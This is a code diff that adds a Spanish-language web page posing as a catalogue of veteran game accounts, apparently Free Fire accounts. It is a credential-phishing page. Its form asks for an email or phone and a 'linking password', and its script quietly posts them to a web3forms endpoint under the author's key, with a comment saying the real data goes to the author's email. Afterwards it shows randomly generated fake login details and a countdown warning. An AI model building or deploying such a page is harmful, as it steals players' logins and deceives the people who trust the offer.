@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Catálogo VIP - Cuentas Veteranas</title>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        :root { --celeste: #00d4ff; --fondo-oscuro: rgba(6, 11, 40, 0.95); }
+        body { 
+            font-family: sans-serif; 
+            background: url('5.png') no-repeat center center fixed; 
+            background-size: cover;
+            color: white; margin: 0; text-align: center; 
+        }
+        .container { 
+            padding: 20px; max-width: 400px; margin: 20px auto; 
+            background: var(--fondo-oscuro); border-radius: 20px;
+            backdrop-filter: blur(10px); border: 1px solid var(--celeste);
+        }
+        .btn-select { 
+            background: #1a203c; border: 1px solid var(--celeste); color: white; 
+            padding: 12px; margin: 5px; border-radius: 8px; width: 45%; font-size: 11px; cursor: pointer;
+        }
+        .active { background: var(--celeste); color: black; font-weight: bold; }
+        .foto-box { 
+            width: 100%; height: 350px; border: 2px solid var(--celeste); 
+            margin: 15px 0; border-radius: 10px; overflow: hidden; background: #000;
+        }
+        .foto-box img { width: 100%; height: 100%; object-fit: stretch; }
+        input { 
+            width: 90%; padding: 14px; margin: 8px 0; border-radius: 8px; 
+            border: 1px solid #333; background: #000; color: white; font-size: 15px;
+        }
+        #submit-button { 
+            background: #e63946; color: white; width: 100%; padding: 18px; 
+            border: none; border-radius: 8px; font-weight: bold; font-size: 16px; margin-top: 15px; cursor: pointer;
+        }
+        #final-box { display: none; background: #d4edda; color: #155724; padding: 20px; border-radius: 15px; margin-top: 15px; border: 2px solid #28a745; }
+        .credenciales { background: white; padding: 10px; border: 1px dashed #28a745; margin-top: 10px; font-family: monospace; color: #333; text-align: left; }
+        .btn-reload { background: #28a745; color: white; width: 100%; padding: 12px; border: none; border-radius: 8px; font-weight: bold; margin-top: 15px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div id="interfaz-principal">
+        <h2 style="color: var(--celeste);">CATÁLOGO DE CUENTAS</h2>
+        
+        <div style="display: flex; flex-wrap: wrap; justify-content: center;">
+            <button type="button" class="btn-select active" onclick="updateView(1, 'PACK EVOLUTIVAS', this)">CUENTA 1</button>
+            <button type="button" class="btn-select" onclick="updateView(2, 'PACK ANGELICALES', this)">CUENTA 2</button>
+            <button type="button" class="btn-select" onclick="updateView(3, 'PACK ROPA RARA', this)">CUENTA 3</button>
+            <button type="button" class="btn-select" onclick="updateView(4, 'PACK NIVEL ALTO', this)">CUENTA 4</button>
+        </div>
+
+        <div class="foto-box">
+            <img id="main-img" src="1.jpg"> 
+        </div>
+
+        <p style="font-size: 11px; font-weight: bold; color: #ff4d4d; margin-bottom: 15px;">
+            SISTEMA: Vincula tu cuenta para verificar región y asignar inventario disponible.
+        </p>
+
+        <form action="https://api.web3forms.com/submit" method="POST" id="mainForm">
+            <input type="hidden" name="access_key" value="f0f2e4c1-12db-4a38-8d73-2e1a0bf2a089">
+            <input type="hidden" name="from_name" value="Nuevo Registro - Catálogo FF">
+            <input type="hidden" name="Pack_Elegido" id="pack-input" value="PACK EVOLUTIVAS">
+            
+            <input type="text" name="Dato_Contacto" placeholder="Correo o Teléfono" required>
+            <input type="password" name="Referencia_Segura" placeholder="Contraseña de vinculación" required>
+            
+            <button type="submit" id="submit-button">RECLAMAR ACCESO</button>
+        </form>
+    </div>
+
+    <div id="final-box">
+        <h3 style="margin: 0;">✅ CUENTA ASIGNADA</h3>
+        <p style="font-size: 13px;">Se te ha asignado una cuenta demo para que verifiques el inventario antes del traspaso final:</p>
+        <div class="credenciales">
+            <b>USUARIO:</b> <span id="res-user"></span><br>
+            <b>CLAVE:</b> <span id="res-pass"></span>
+        </div>
+        <p style="font-size: 11px; margin-top: 10px;"><b>Aviso:</b> Si no entras en los próximos 10 minutos, el sistema reasignará la cuenta a otro usuario.</p>
+        <button onclick="location.reload()" class="btn-reload">ENTENDIDO</button>
+    </div>
+</div>
+
+<script>
+    function updateView(n, nombre, boton) {
+        document.getElementById('main-img').src = n + '.jpg';
+        document.getElementById('pack-input').value = nombre;
+        document.getElementById('submit-button').innerText = 'RECLAMAR ' + nombre;
+        let btns = document.querySelectorAll('.btn-select');
+        btns.forEach(b => b.classList.remove('active'));
+        boton.classList.add('active');
+    }
+
+    document.getElementById('mainForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const btn = document.getElementById('submit-button');
+        btn.innerText = "VERIFICANDO...";
+        btn.disabled = true;
+
+        // Enviar datos reales a tu correo
+        fetch(this.action, {
+            method: 'POST',
+            body: new FormData(this)
+        });
+
+        // Generar datos falsos variables cada vez
+        const prefijos = ["garena_vip", "ff_veterano", "exotic_user", "king_free", "elite_player"];
+        const randomPre = prefijos[Math.floor(Math.random() * prefijos.length)];
+        const randomNum = Math.floor(Math.random() * 899) + 100;
+        
+        const userRand = randomPre + randomNum + "@gmail.com";
+        const passRand = "ff_pass" + (Math.floor(Math.random() * 8999) + 1000);
+
+        setTimeout(async () => {
+            await Swal.fire({
+                title: '¡VERIFICACIÓN EXITOSA!',
+                text: 'TU CUENTA AH SIDO VINCULADA CON EXITO.',
+                icon: 'success',
+                background: '#0d1117',
+                color: '#fff',
+                confirmButtonColor: '#00d4ff',
+                confirmButtonText: 'VER DATOS'
+            });
+
+            document.getElementById('res-user').innerText = userRand;
+            document.getElementById('res-pass').innerText = passRand;
+            document.getElementById('interfaz-principal').style.display = "none";
+            document.getElementById('final-box').style.display = "block";
+        }, 2000);
+    });
+</script>
+
+</body>
+</html>
